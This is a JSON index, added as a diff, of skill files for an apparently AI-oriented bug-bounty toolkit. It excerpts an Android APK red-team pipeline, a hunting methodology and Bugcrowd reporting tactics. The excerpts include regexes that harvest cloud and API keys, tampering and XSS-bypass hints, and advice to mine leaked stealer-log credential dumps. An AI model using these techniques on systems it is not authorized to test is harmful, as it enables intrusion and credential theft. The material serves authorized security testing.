@@ -1,0 +1,593 @@
+{
+  "schema": 1,
+  "repo": "elementalsouls/Claude-BugHunter",
+  "tree_sha": "3169cb99a40e20febc5cc55b3f5edfd63456052c",
+  "truncated_paths": 71,
+  "skills": [
+    {
+      "skill_path": "skills/apk-redteam-pipeline/SKILL.md",
+      "blob_sha": "6ea9dc7651e772e3b6ceb628401e95d901862654",
+      "source_url": "https://github.com/elementalsouls/Claude-BugHunter/blob/64410edb7f445e1837665e2fd713d47958a51094/skills/apk-redteam-pipeline/SKILL.md",
+      "fetched_at": "2026-11-17T00:18:16.822Z",
+      "generated_at": null,
+      "model": null,
+      "status": "failed",
+      "last_error": "Skill card failed schema or evidence validation",
+      "card_prompt_version": "skill_card_v1",
+      "frontmatter": {
+        "name": "apk-redteam-pipeline",
+        "description": "End-to-end Android APK red-team pipeline — automated APK acquisition (Play Store + apkpure + apkmirror fallback), jadx decompilation, secret/URL/JWT/Firebase grep, pinned-cert extraction, exported-component enumeration, Frida runtime instrumentation templates, intent-injection probes. Built from an authorized external red-team engagement where 7 APKs were pulled manually, 4 download attempts truncated, and a hardcoded JWT + 30 internal API endpoints were recovered from one of the apps. Use when "
+      },
+      "excerpt": "---\nname: apk-redteam-pipeline\ndescription: End-to-end Android APK red-team pipeline — automated APK acquisition (Play Store + apkpure + apkmirror fallback), jadx decompilation, secret/URL/JWT/Firebase grep, pinned-cert extraction, exported-component enumeration, Frida runtime instrumentation templates, intent-injection probes. Built from an authorized external red-team engagement where 7 APKs were pulled manually, 4 download attempts truncated, and a hardcoded JWT + 30 internal API endpoints were recovered from one of the apps. Use when target has a mobile app catalogue (Play Store developer page), when you find an APK URL hosted on a web server, or when post-recon mentions \"mobile app\" in scope.\nsources: authorized-engagement\nreport_count: 1\n---\n\n## When to use this skill\n\nTrigger when:\n- Recon surfaces 1+ mobile apps under the target's developer name (Play Store dev page)\n- A web app hosts `*.apk` files directly (e.g. `Recruitz.apk` found on a subdomain during one engagement)\n- APK package IDs leaked via stealer logs (e.g. `com.<brand>.app`, `com.<brand>.<sub-brand>` patterns in stealer dump format)\n- Customer-facing app, dealer/partner portal, or employee mobile companion app is in scope\n- Bug bounty program lists Android in scope\n\nDO NOT use for:\n- iOS-only targets (different pipeline — IPA reverse, MobSF, frida-ios-dump)\n- React Native / Flutter web apps already covered by JS bundle analysis\n- Server-side only assessments\n\n---\n\n## Stage 0 — Inventory all org-owned apps\n\n### Play Store developer-page scrape\n```bash\n# Find developer page from the target's brand name\ncurl -sk -A \"Mozilla/5.0\" \"https://play.google.com/store/apps/developer?id=<Brand+Name>\" -o /tmp/dev.html\n\n# Extract package IDs\ngrep -oE 'id=[a-zA-Z0-9._]+' /tmp/dev.html | sort -u\n```\n\nExample output (anonymized — 7 packages typical for a multi-brand conglomerate):\n```\ncom.events.<brand>build\ncom.<corp>.<sub-brand-1>\ncom.<corp>.<sub-brand-2>\ncom.<corp>.<flagship>\ncom.<corp>.<product-line-1>\ncom.<corp>.<product-line-2>\ncom.<corp>.<sub-brand-3>\n```\n\n### Cross-reference with stealer logs\nStealer-log format includes package names like `*@com.<corp>.<app>` — extract these from `creds_userpass.txt` if you have a leaked dump.\n\n### Brand permutation guesses (multi-brand conglomerate patterns)\n```\ncom.<brand>.app\ncom.<brand>.mobile  \ncom.<brand>.android\ncom.<brand>connect.app\nin.<brand>.dealer\nin.co.<brand>.app\n```\n\n---\n\n## Stage 1 — APK acquisition\n\n### Primary: APKPure direct (no auth required)\n```bash\n# Follow 302 redirects to actual download\ncurl -sk -L --max-time 60 \\\n  \"https://d.apkpure.net/b/APK/<package_id>?version=latest\" \\\n  -o \"<package_id>.apk\"\n\n# Or via the legacy d-XX.winudf.com mirror chain (we saw this work)\n```\n\n### Secondary: APKMirror search\n```bash\ncurl -sk -A \"Mozilla/5.0\" \"https://www.apkmirror.com/?post_type=app_release&searchtype=apk&s=<brand>\" \\\n  | grep -oE 'href=\"[^\"]+\\.apk[^\"]*\"' | sort -u\n```\n\n### Tertiary: APKPure web search\n```bash\ncurl -sk \"https://apkpure.com/search?q=<brand>\" | grep -oE 'data-dt-app=\"[^\"]+\"'\n```\n\n### XAPK vs APK\n- `.xapk` = a zip containing multiple split APKs (base + config.armeabi-v7a + config.en + etc.)\n- Unzip outer first, then unzip the inner `base.apk` or `<package>.apk`\n- Some apkpure downloads return truncated XAPK with missing EOCD signature — symptom of CDN rate-limiting; rotate IP and retry, OR use `7z x` which is more lenient than `unzip`\n\n```bash\n# Standard unzip (works for clean APK)\nunzip -o <package>.apk -d extracted_<package>/\n\n# For truncated/repaired XAPK\n7z x -y <package>.apk -o\"extracted_<package>\"\n\n# For nested XAPK\nfor inner in extracted_<package>/*.apk; do\n  mkdir -p \"extracted_<package>/$(basename \"$inner\" .apk)\"\n  unzip -o \"$inner\" -d \"extracted_<package>/$(basename \"$inner\" .apk)\"\ndone\n```\n\n---\n\n## Stage 2 — DEX decompilation (jadx)\n\n```bash\n# Install\nbrew install jadx          # macOS\n# or\nwget https://github.com/skylot/jadx/releases/latest/download/jadx-1.5.x.zip\n\n# Decompile\njadx -d decompiled_<package>/ <package>.apk\n\n# For XAPK that contains multiple APKs\nfor inner in extracted_<package>/*.apk; do\n  jadx -d decompiled_<package>_$(basename \"$inner\" .apk)/ \"$inner\"\ndone\n```\n\nFor a fast \"strings only\" pass without full decompilation:\n```bash\nfind extracted_<package> -name \"classes*.dex\" -exec strings -8 {} \\; > strings_<package>.txt\n```\n\n---\n\n## Stage 3 — Secret grep (the 60-pattern catalog)\n\n```bash\n# URL grep — owned-domain references\ngrep -oE 'https?://[a-zA-Z0-9.-]+\\.(target1|target2|target3)\\.(com|io|net|in)[a-zA-Z0-9./_?=&%-]*' strings_<package>.txt | sort -u\n\n# Internal IP / port URLs\ngrep -oE 'https?://(10\\.|172\\.(1[6-9]|2[0-9]|3[01])\\.|192\\.168\\.|127\\.)[0-9.]+(:[0-9]+)?[a-zA-Z0-9./_?=&-]*' strings_<package>.txt\n\n# Cloud credentials\ngrep -oE 'AKIA[A-Z0-9]{16}'                            # AWS Access Key\ngrep -oE 'aws_secret_access_key[\\s:=]+[A-Za-z0-9/+=]{40}' # AWS Secret\ngrep -oE 'AIza[A-Za-z0-9_-]{35}'                       # Google API key\ngrep -oE 'ya29\\.[A-Za-z0-9_-]+'                        # Google OAuth refresh token\ngrep -oE 'gh[ps]_[A-Za-z0-9]{36}'                      # GitHub PAT\ngrep -oE 'glpat-[A-Za-z0-9_-]{20}'                     # GitLab PAT\ngrep -oE 'xox[pbar]-[A-Za-z0-9-]+'                     # Slack token\ngrep -oE 'sk-[A-Za-z0-9]{48}'                          # OpenAI API key\ngrep -oE 'sk-ant-[A-Za-z0-9_-]{90,}'                   # Anthropic API key\ngrep -oE 'AC[a-f0-9]{32}'                              # Twilio Account SID\ngrep -oE 'sk_live_[A-Za-z0-9]{24}'                     # Stripe live key\ngrep -oE 'pk_live_[A-Za-z0-9]{24}'                     # Stripe publishable\ngrep -oE 'mailgun-[A-Za-z0-9-]{40}'                    # Mailgun\ngrep -oE 'SG\\.[A-Za-z0-9_-]{22}\\.[A-Za-z0-9_-]{43}'    # SendGrid\n\n# JWT (any algorithm)\ngrep -oE 'eyJ[A-Za-z0-9_-]+\\.eyJ[A-Za-z0-9_-]+\\.[A-Za-z0-9_-]*' strings_<package>.txt\n\n# Firebase\ngrep -oE '\"(api_key|project_id|database_url|storage_bucket|client_id|mobilesdk_app_id|google_app_id|gcm_defaultSenderId)\"\\s*:\\s*\"[^\"]+\"' \\\n  extracted_<package>/res/values/strings.xml \\\n  extracted_<package>/google-services.json \\\n  decompiled_<package>/resources/AndroidManifest.xml 2>/dev/null\n\n# OAuth client secrets\ngrep -oE 'client_secret[\"\\s:=]+[A-Za-z0-9_-]{24,}' strings_<package>.txt\n\n# Hardcoded passwords (heuristic — many false positives, manual review)\ngrep -oE '\"password\"\\s*:\\s*\"[^\"]+\"|password\\s*=\\s*\"[^\"]+\"' decompiled_<package>/sources/**/*.java 2>/dev/null\n```\n\n### Real-world example finding (anonymized — from an authorized engagement)\n```\n# Customer-facing APK shipped a hardcoded URL of this shape:\nhttps://api.<client>.example/<path-token>/<resource-token>?token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.<payload>.<sig>\n\n# Decoded JWT payload: {\"sid\":<int>,\"iat\":<unix-ts>,\"exp\":<unix-ts>}\n# Expired ~8 years earlier — but path tokens + 30 /v1/* endpoints still useful intel\n```\n\n---\n\n## Stage 4 — Pinned certificate extraction\n\n```bash\n# Find .cer / .der / .pem files in assets/\nfind extracted_<package>/assets -iname \"*.cer\" -o -iname \"*.der\" -o -iname \"*.pem\" -o -iname \"*.crt\" 2>/dev/null\n\n# Or in network_security_config.xml\nfind extracted_<package> -name \"network_security_config.xml\" -exec cat {} \\;\n\n# For each cert, extract subject + SAN (might reveal new internal API hosts)\nfor cert in $(find extracted_<package>/assets -iname \"*.cer\"); do\n  echo \"=== $cert ===\"\n  openssl x509 -in \"$cert\" -noout -subject -issuer -dates 2>/dev/null\n  openssl x509 -in \"$cert\" -noout -text 2>/dev/null | grep -E 'Subject:|DNS:|Issuer:|Validity'\ndone\n```\n\n### Real-world example\nA customer-facing APK from an authorized engagement contained `assets/api_<service>_<domain>_com.cer` — revealed the existence of an `api.<service>.<domain>.example` asset that had NOT surfaced in passive recon.\n\n---\n\n## Stage 5 — Exported component enumeration\n\nAndroidManifest.xml lists components. Exported ones (especially with `android:exported=\"true\"` or implicit-export via intent-filter) can be triggered",
+      "card": null
+    },
+    {
+      "skill_path": "skills/bb-local-toolkit/SKILL.md",
+      "blob_sha": "a6b0554ad0f41f0b68d5b0d1d0fa17a7a7436823",
+      "source_url": "https://github.com/elementalsouls/Claude-BugHunter/blob/64410edb7f445e1837665e2fd713d47958a51094/skills/bb-local-toolkit/SKILL.md",
+      "fetched_at": "2026-11-17T00:18:16.822Z",
+      "generated_at": null,
+      "model": null,
+      "status": "too_large",
+      "last_error": null,
+      "card_prompt_version": "skill_card_v1",
+      "frontmatter": {
+        "name": "",
+        "description": ""
+      },
+      "excerpt": "",
+      "card": null
+    },
+    {
+      "skill_path": "skills/bb-methodology/SKILL.md",
+      "blob_sha": "9006bb32990ef4e1f59595f23f9a9b5c962f57a6",
+      "source_url": "https://github.com/elementalsouls/Claude-BugHunter/blob/64410edb7f445e1837665e2fd713d47958a51094/skills/bb-methodology/SKILL.md",
+      "fetched_at": "2026-11-17T00:18:16.822Z",
+      "generated_at": "2026-11-17T00:18:16.822Z",
+      "model": "deepseek-flash",
+      "status": "ok",
+      "last_error": null,
+      "card_prompt_version": "skill_card_v1",
+      "frontmatter": {
+        "name": "bb-methodology",
+        "description": "Use at the START of any bug bounty hunting session, when switching targets, or when feeling lost about what to do next. Master orchestrator that combines the 5-phase non-linear hunting workflow with the critical thinking framework (developer psychology, anomaly detection, What-If experiments). Routes to all other skills based on current hunting phase. Also use when asking \"what should I do next\" or \"where am I in the process.\""
+      },
+      "excerpt": "---\nname: bb-methodology\ndescription: Use at the START of any bug bounty hunting session, when switching targets, or when feeling lost about what to do next. Master orchestrator that combines the 5-phase non-linear hunting workflow with the critical thinking framework (developer psychology, anomaly detection, What-If experiments). Routes to all other skills based on current hunting phase. Also use when asking \"what should I do next\" or \"where am I in the process.\"\nsources: community, public_research\n---\n\n# Bug Bounty Methodology: Workflow + Mindset\n\nMaster orchestrator for hunting sessions. Combines the 5-phase non-linear workflow with the critical thinking framework that separates top 1% hunters from the rest.\n\n---\n\n## PART 0: MODE CONFIRMATION (Before Anything Else)\n\n**Confirm the engagement type before deciding what counts as a finding.** The same target produces a different report shape depending on which mode applies. Getting this wrong is the single biggest waste of time in this workflow — answer it explicitly before Phase 0.\n\n| Engagement type | What counts as a finding | What gets rejected |\n|---|---|---|\n| **Bug bounty** (H1 / Bugcrowd / Intigriti / private VDP) | Impact-demonstrated bugs ONLY. Full chain to attacker-attainable harm. | Hygiene (EoL software alone, permissive CSP alone, stack traces, info disclosure without concrete impact, \"best practice\" violations) |\n| **Red team** (external client engagement) | Hygiene findings + recon + IoCs + defensive-state observations are ALL deliverables | Nothing — even \"no finding here\" is reportable as a positive defensive observation |\n| **Pentest** (signed SoW / WAPT) | Depends on SoW. Read scope explicitly. Usually accepts hygiene + impact + recon | Out-of-scope assets, unsigned testing |\n| **Internal audit** | Compliance-mapped findings (PCI / ISO / NIST / DPDPA / GDPR) | Findings without a control-mapping |\n\n**Hard rule:** Before Phase 0 runs, write the engagement type as the first line in your hunt notes. If you can't answer it from the user's instruction, ASK once. Don't assume — the mistake costs both you and the triager.\n\n**Lesson from an authorized engagement:** First-pass on this target produced 5 hygiene findings (SP2013 EoL, permissive CSP, stack traces) shipped in red-team format. The engagement was bug-bounty. Findings would have been N/A'd as \"informational, no impact demonstrated.\" After the corrected pass with hygiene-as-context-not-finding, the same target yielded 11 impact-demonstrated bugs including 3 Critical.\n\n---\n\n## PART 1: MINDSET (How to Think)\n\n### Core Principle\n\nHunting is not \"find a bug\" -- it is \"prove an attack scenario.\" Think like an attacker with a specific goal, not a scanner looking for patterns.\n\n### Daily Discipline: Define, Select, Execute\n\nBefore touching any tool:\n\n1. **Define**: \"Today I target [feature/domain] to achieve [CIA impact]\"\n2. **Select**: Choose 1-2 vuln classes (IDOR, Race Condition, etc.)\n3. **Execute**: Focus ONLY on selected techniques. No wandering.\n\n### 5 Ultimate Goals (Pick One Per Session)\n\n1. **Confidentiality** -- steal data the attacker shouldn't see\n2. **Integrity** -- modify data the attacker shouldn't change\n3. **Availability** -- disrupt service (app-level DoS only)\n4. **Account Takeover** -- control another user's account\n5. **RCE** -- execute commands on the server\n\n### 4 Thinking Domains\n\n#### 1. Critical Thinking (deep analysis)\n\n**Question trust boundaries:**\n- Frontend control disabled? Send request directly via proxy\n- `user_role=user` cookie? Change to `admin`\n- `price=1000` in POST? Change to `1`\n- `<script>` blocked? Try `<img onerror=...>`\n\n**Reverse-engineer developer psychology:**\n- Feature A has auth checks -> Similar feature B (newly added) probably doesn't\n- Complex flows (coupon + points + refund) -> Edge cases have bugs\n- `/api/v2/user` exists -> Does `/api/v1/user` still work with weaker auth?\n\n**What-If experiments:**\n- Skip checkout -> hit `/checkout/success` directly\n- Skip 2FA -> navigate to `/dashboard`\n- Send coupon request 10x simultaneously -> Race condition?\n- Replace `guid=f8a2...` with `id=100` on sibling endpoint -> IDOR?\n\n#### 2. Multi-Perspective (multiple angles)\n\n| Perspective | What to check |\n|------------|---------------|\n| Horizontal (same role) | User A's token + User B's ID -> IDOR |\n| Vertical (different role) | Regular user -> `/admin/deleteUser` |\n| Data flow (proxy view) | Hidden params in JSON: `debug=false`, `discount_rate` |\n| Time/State | Race conditions, post-delete session reuse |\n| Client environment | Mobile UA -> legacy API with weaker auth |\n| Business impact | \"What's the $ damage if this breaks?\" |\n\n#### 3. Tactical Thinking (pattern detection)\n\n- **Naming anomaly**: `userId` everywhere but suddenly `user_id` -> different dev, weaker security\n- **Error diff**: Same 403 but different JSON structure -> different backend systems\n- **Environment diff**: Prod vs Dev/Staging -> debug headers, CSP disabled\n- **Version diff**: JS file before/after update -> new endpoints, removed params\n- **Supply chain**: Check framework/library versions for known CVEs\n- **Third-party integration**: Stripe/Auth0/Intercom -> webhook signature missing?\n\n#### 4. Strategic Thinking (big picture)\n\n- **Asymmetry**: Defender must patch ALL holes. You only need ONE.\n- **Intuition engineering**: Log why something \"feels wrong.\" Verify later. Update mental DB.\n- **Unknown management**: Can't understand something? Add to \"investigate later\" list. Just-in-Time Learning.\n\n### Amateur vs Pro: 7-Phase Comparison\n\n| Phase | Amateur | Pro |\n|-------|---------|-----|\n| Recon | Main domain only | Shadow IT, dev environments, all assets |\n| Discovery | Look for errors | Look for design contradictions, business logic flaws |\n| Exploit | Give up when blocked | Build filter-bypass payloads |\n| Escalation | Report the phenomenon only | Chain to real harm (session steal, ATO) |\n| Feasibility | Include unrealistic conditions | Minimize attack prerequisites |\n| Reporting | State facts only | Quantify business risk |\n| Retest | Check if old PoC fails | Analyze fix method, find incomplete patches |\n\n### Two Approach Routes\n\n- **Route A (Feature-based)**: \"This feature is complex\" -> deep-dive its input handling -> find vuln\n- **Route B (Vuln-based)**: \"I want IDOR\" -> find endpoints with sequential IDs -> test access control\n\n### Anti-Patterns (Stop Doing These)\n\n- **Program hopping**: Stick with one target minimum 2 weeks / 30 hours\n- **Tool-only hunting**: Automation finds duplicates. Manual testing finds unique bugs.\n- **Rabbit hole**: Max 45 min per parameter. Set a timer. If stuck, sleep on it.\n- **No goal**: \"Just looking around\" = wasted time. Always Define first.\n\n---\n\n## PART 2: WORKFLOW (What to Do)\n\n### The 5-Phase Non-Linear Flow\n\n```\n+-------------------------------------------------+\n|                                                 |\n|  +----------+    +----------+    +----------+   |\n|  | 1. RECON |---+| 2. MAP   |---+| 3. FIND  |  |\n|  +----------+    +-----+----+    +-----+-----+  |\n|       ^                |               |         |\n|       |                v               v         |\n|       |          +----------+    +----------+    |\n|       +----------| 4. PROVE |---+| 5. REPORT|   |\n|                  +----------+    +----------+    |\n|                                                  |\n|  Non-linear: stuck at any phase -> go back       |\n|  New API found at phase 3 -> return to phase 2   |\n|  WAF blocks at phase 4 -> origin IP from phase 1 |\n+-------------------------------------------------+\n```\n\n**THIS IS NOT LINEAR.** Move freely between phases. When stuck, return to a previous phase.\n\n### Phase 0: SESSION START (Every Time)\n\n**Before touching any tool, answer these:**\n\n1. **Define**: \"Today I target [feature/domain] to achieve [C/I/A/ATO/RCE]\"\n2. **Select**: Choose 1-2 vuln classes (IDOR, XSS, SSRF, etc.)\n3. **Execute**: Focus ONLY on selected techniques\n\n**Route selection -- Wide or Deep?",
+      "card": {
+        "title_zh": "漏洞赏金方法论编排",
+        "purpose_zh": "作为漏洞赏金狩猎会话的总编排器，先确认合作类型，再结合五阶段非线性工作流与批判性思维框架，指导当前阶段该做什么并路由到其他技能。",
+        "does": [
+          "在开始前确认合作类型（赏金、红队、渗透测试、内部审计）并界定什么算有效发现",
+          "提供定义目标、选择漏洞类别、专注执行的每日纪律与五大终极目标",
+          "给出批判性思维、多视角、战术、战略四个思考域及反模式清单",
+          "描述侦察、映射、漏洞发现、证明升级、报告的五阶段非线性流程",
+          "按输入类型（ID参数、搜索字段、URL、文件上传等）给出漏洞测试决策流",
+          "提供错误型与盲注型探测的先后顺序及升级到业务影响的判断路径"
+        ],
+        "inputs": [
+          "目标域名或功能范围",
+          "合作类型（赏金/红队/渗透测试/内部审计）",
+          "当前所处狩猎阶段或困惑点",
+          "选定的漏洞类别（如IDOR、XSS、SSRF）"
+        ],
+        "outputs": [
+          "当前阶段应执行的动作与下一步路由建议",
+          "漏洞测试决策流与升级路径建议",
+          "会话目标定义与漏洞类别选择",
+          "发现有效性的判定标准（按合作类型）"
+        ],
+        "scenarios": [
+          "开始新的漏洞赏金狩猎会话时",
+          "切换目标或范围更新时",
+          "对下一步该做什么感到迷茫时",
+          "判断某个发现是否值得报告时",
+          "在侦察、映射、发现、证明、报告阶段之间切换时"
+        ],
+        "prerequisites": [
+          "已获得目标授权并明确合作类型",
+          "具备代理工具（如Burp/Caido）用于请求分析与端点映射"
+        ],
+        "limits": [
+          "原文为方法论指导，未提供具体工具实现或自动化脚本",
+          "阶段流程为非线性，需自行判断回退时机",
+          "单参数最长45分钟、单端点20分钟、单主机5分钟的时限为原文建议"
+        ],
+        "hosts": [
+          "未说明"
+        ],
+        "risk_flags": [],
+        "tags": [
+          "安全",
+          "调研",
+          "其他"
+        ],
+        "evidence": [
+          {
+            "field": "purpose_zh",
+            "quote": "Master orchestrator for hunting sessions. Combines the 5-phase non-linear workflow with the critical thinking framework that separates top 1% hunters from the rest."
+          },
+          {
+            "field": "purpose_zh",
+            "quote": "Routes to all other skills based on current hunting phase."
+          },
+          {
+            "field": "does",
+            "quote": "Confirm the engagement type before deciding what counts as a finding."
+          },
+          {
+            "field": "does",
+            "quote": "#### 1. Critical Thinking (deep analysis)"
+          },
+          {
+            "field": "does",
+            "quote": "The 5-Phase Non-Linear Flow"
+          },
+          {
+            "field": "inputs",
+            "quote": "If you can't answer it from the user's instruction, ASK once."
+          },
+          {
+            "field": "inputs",
+            "quote": "Before touching any tool, answer these:"
+          },
+          {
+            "field": "scenarios",
+            "quote": "Use at the START of any bug bounty hunting session, when switching targets, or when feeling lost about what to do next."
+          },
+          {
+            "field": "scenarios",
+            "quote": "Also use when asking \"what should I do next\" or \"where am I in the process.\""
+          },
+          {
+            "field": "prerequisites",
+            "quote": "Before Phase 0 runs, write the engagement type as the first line in your hunt notes."
+          }
+        ]
+      }
+    },
+    {
+      "skill_path": "skills/bug-bounty/SKILL.md",
+      "blob_sha": "1a56ed2bc4872bc940b7e415785b8ae51bf76625",
+      "source_url": "https://github.com/elementalsouls/Claude-BugHunter/blob/64410edb7f445e1837665e2fd713d47958a51094/skills/bug-bounty/SKILL.md",
+      "fetched_at": "2026-11-17T00:18:16.822Z",
+      "generated_at": null,
+      "model": null,
+      "status": "too_large",
+      "last_error": null,
+      "card_prompt_version": "skill_card_v1",
+      "frontmatter": {
+        "name": "",
+        "description": ""
+      },
+      "excerpt": "",
+      "card": null
+    },
+    {
+      "skill_path": "skills/bugcrowd-reporting/SKILL.md",
+      "blob_sha": "daa93e11f19e82fa8628256f17a3a8f323e8080f",
+      "source_url": "https://github.com/elementalsouls/Claude-BugHunter/blob/64410edb7f445e1837665e2fd713d47958a51094/skills/bugcrowd-reporting/SKILL.md",
+      "fetched_at": "2026-11-17T00:18:16.822Z",
+      "generated_at": null,
+      "model": null,
+      "status": "failed",
+      "last_error": "Skill card failed schema or evidence validation",
+      "card_prompt_version": "skill_card_v1",
+      "frontmatter": {
+        "name": "bugcrowd-reporting",
+        "description": "Bugcrowd-specific reporting tactics complementing report-writing: VRT category search-and-fallback strategy when no exact match exists, manual severity override when VRT defaults underrate impact, severity-request paragraph as first body section, OOS-clause rebuttal templates (rate limiting on auth-flow endpoints, debug-info framing, user-enumeration with sensitive PII, theoretical-issue counter), chained-finding cross-reference patterns, target selection for QA-vs-prod programs, researcher-side"
+      },
+      "excerpt": "---\nname: bugcrowd-reporting\ndescription: \"Bugcrowd-specific reporting tactics complementing report-writing: VRT category search-and-fallback strategy when no exact match exists, manual severity override when VRT defaults underrate impact, severity-request paragraph as first body section, OOS-clause rebuttal templates (rate limiting on auth-flow endpoints, debug-info framing, user-enumeration with sensitive PII, theoretical-issue counter), chained-finding cross-reference patterns, target selection for QA-vs-prod programs, researcher-side hygiene (Bugcrowdninja email alias, account state restoration, friendly-tester posture). Use when filing a Bugcrowd submission, when VRT default seems wrong, when triager closes as OOS or downgrades severity, when chaining linked submissions, or when scope distinguishes production from QA. Pairs with report-writing and triage-validation.\"\nsources: bugcrowd, community\n---\n\n# BUGCROWD REPORTING — Program-Specific Tactics\n\n> Companion to the generic `report-writing` skill. Use when working specifically on Bugcrowd submissions where VRT mapping, OOS-clause rebuttals, or per-program target selection matter.\n\nThis skill encodes patterns that apply specifically to Bugcrowd's submission flow. For the generic per-platform templates (HackerOne / Bugcrowd / Intigriti / Immunefi report bodies), use the `report-writing` skill. For the 7-Question Gate before deciding to report at all, use `triage-validation`.\n\n---\n\n## 1. VRT Category Selection — Search & Fallback Strategy\n\nBugcrowd's submission form requires a single VRT (Vulnerability Rating Taxonomy) selection. The dropdown's default severity is bound to the chosen node — pick wrong and the form auto-suggests a lower priority (often P4) when the actual impact is P3 or P2.\n\n> Note: VRT default severities are not fixed constants. Bugcrowd revises the VRT schema across versions, and individual programs can remap defaults via their own priority configuration. The P-values shown in the examples below (e.g., \"No Rate Limiting on Form → Login\" defaulting to P4) are the typical baseline at time of writing — always read the severity the *current* form actually auto-suggests for *this* program rather than assuming the value here.\n\n### 1.1 Search hierarchy (try in order, pick the highest-severity match that still describes the bug)\n\nFor any finding, search the VRT dropdown with these terms in this order:\n\n1. **The bug's primary class** — e.g., `IDOR`, `XSS`, `SSRF`, `auth bypass`, `2FA bypass`\n2. **The data category exposed** — e.g., `PII`, `sensitive data exposure`, `disclosure of secrets`\n3. **The control bypassed** — e.g., `broken access control`, `authentication bypass`\n4. **The endpoint type** — e.g., `no rate limiting on form > login`, `no rate limiting on form > change password`\n5. **The generic parent node** — e.g., `Server Security Misconfiguration > Other`, `Broken Access Control > Other`\n\n### 1.2 Pick the highest-severity match that still accurately describes the bug\n\nNever select a VRT that misrepresents the bug just to get a higher default severity. Triagers will reassign and may flag the misrepresentation. The discipline is: pick the most specific *accurate* VRT, then use §2 (Manual Severity Override) if the default is wrong.\n\n### 1.3 Common mappings worth knowing\n\n| Finding type | First-choice VRT | Fallback |\n|---|---|---|\n| ATO via missing 2FA on password change | Broken Authentication & Session Management → Second Factor Authentication (2FA/MFA) → Bypass | Broken Auth → Authentication Bypass → Other |\n| Password oracle without rate limit | Broken Authentication & Session Management → Authentication Bypass → Other | Server Security Misconfiguration → No Rate Limiting on Form → Login |\n| GraphQL introspection / APQ allowlist bypass | Server Security Misconfiguration → Other (justify in body) | Broken Access Control → Other |\n| Username → real name PII enumeration | Sensitive Data Exposure → PII Leakage / Disclosure of Secrets → Non-Corporate User | Broken Access Control → Other |\n| State desync on security-sensitive action | Application-Level DoS → Other (with state-desync framing) | Server Security Misconfiguration → Other |\n| Email/SMS pumping on auth-flow endpoint | Server Security Misconfiguration → No Rate Limiting on Form → Email-Triggering / SMS-Triggering | Server Security Misconfiguration → No Rate Limiting on Action |\n| Token brute-force (email-change OTP, password reset) | Broken Authentication → Authentication Bypass → Other | Server Security Misconfiguration → No Rate Limiting on Action |\n\n### 1.4 If no good VRT exists\n\nPick `Server Security Misconfiguration → Other` or `Broken Access Control → Other` and **lead the description body with a \"VRT mapping note\"** explaining why the chosen node is the closest available match and what the bug actually is.\n\n---\n\n## 2. Manual Severity Override\n\nBugcrowd's form lets you manually set Technical Severity *separate from the VRT default*. The form text itself states: *\"A severity rating suggested by the VRT is not guaranteed to be the severity rating applied to your submission.\"*\n\n### 2.1 When to override\n\nOverride the VRT default when:\n- The chained outcome is a higher severity than the standalone bug class (chain → ATO)\n- The VRT category is approximate and its default doesn't reflect the actual impact class\n- The program's own Focus Areas explicitly list this outcome at a higher severity than VRT's default\n- The data class exposed is more sensitive than the VRT's example uses (e.g., real-name PII vs. handle enumeration)\n\n### 2.2 How to override (form mechanics)\n\n1. Select the VRT that most accurately describes the bug (per §1)\n2. Note the auto-suggested severity (P4, P3, etc.)\n3. In the **Technical Severity** field, manually pick the severity you're requesting\n4. Add a **Severity Request** paragraph as the FIRST section of the description body (per §3)\n\n### 2.3 Don't over-claim\n\nP1 inflation is the fastest way to lose triager trust. Reserve P1 for ATO without interaction, RCE, mass PII exfiltration, fund theft, and similar Critical-bucket impacts. If the chain to P1 requires a separate stolen-cookie premise, file the standalone primitive at P3 and discuss the chain explicitly with cross-references (per §4).\n\n---\n\n## 3. Severity-Request Paragraph — Always First in the Body\n\nWhen the VRT default underrates impact, the FIRST section of the description body should be a severity-request paragraph. This is the first thing the triager reads and it pre-empts the auto-close that often happens when triagers see \"P4\" in the form.\n\n### 3.1 Template\n\n```markdown\n## Severity request — please review carefully before applying VRT default\n\nThe closest VRT category for this finding is \"[chosen VRT],\" which Bugcrowd defaults to **P[N] ($X-$Y in [program]'s rubric)**. **I am requesting evaluation at P[M] [standalone | in chain with submission XXXX]** for the following reasons:\n\n1. **[Impact axis 1]** — [specific reason this finding exceeds the VRT default's example]\n2. **[Impact axis 2]** — [specific reason, often citing the program's own Focus Areas]\n3. **[Impact axis 3]** — [specific reason, often comparing to historical bounty payouts for the same data class]\n\n[Optional: one paragraph contrasting the VRT default's typical example with this finding's actual impact, e.g., \"P4 = No Rate Limiting on Login Form\" applies to ordinary login pages where brute force is bounded by lockout policies; this endpoint has neither lockout nor throttle.]\n```\n\n### 3.2 Worked example pattern\n\n```markdown\n## Severity request — please review carefully before applying VRT default\n\nThe closest VRT category for this finding is \"No Rate Limiting on Form → Login,\" which Bugcrowd defaults to **P4 ($XX–$YY in this program's rubric)**. **I am requesting evaluation at P3 standalone, P2 in chain with submission XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX** for the following reasons:\n\n1. **[Endpoint] is a password-disclosure oracle, not a generic rate-limit gap.** The endpoin",
+      "card": null
+    },
+    {
+      "skill_path": "skills/cloud-iam-deep/SKILL.md",
+      "blob_sha": "19aba18c86d8bff11010037fac84006926eeaa21",
+      "source_url": "https://github.com/elementalsouls/Claude-BugHunter/blob/64410edb7f445e1837665e2fd713d47958a51094/skills/cloud-iam-deep/SKILL.md",
+      "fetched_at": "2026-11-17T00:18:16.822Z",
+      "generated_at": "2026-11-17T00:18:16.822Z",
+      "model": "deepseek-flash",
+      "status": "ok",
+      "last_error": null,
+      "card_prompt_version": "skill_card_v1",
+      "frontmatter": {
+        "name": "cloud-iam-deep",
+        "description": "Cloud IAM red-team attack chain across AWS, Azure, GCP — focused on EXTERNAL exploitation paths and post-credential-discovery privilege analysis. Covers IAM enumeration (aws iam, az role, gcloud iam), STS/AssumeRole chaining, Azure Managed Identity abuse (via SSRF/leak), GCP service account JSON abuse, IMDSv1/v2 attacks via SSRF, K8s ServiceAccount token privilege analysis once held (token discovery / cluster exposure is owned by hunt-k8s), role-trust-policy confused-deputy, cross-account assume"
+      },
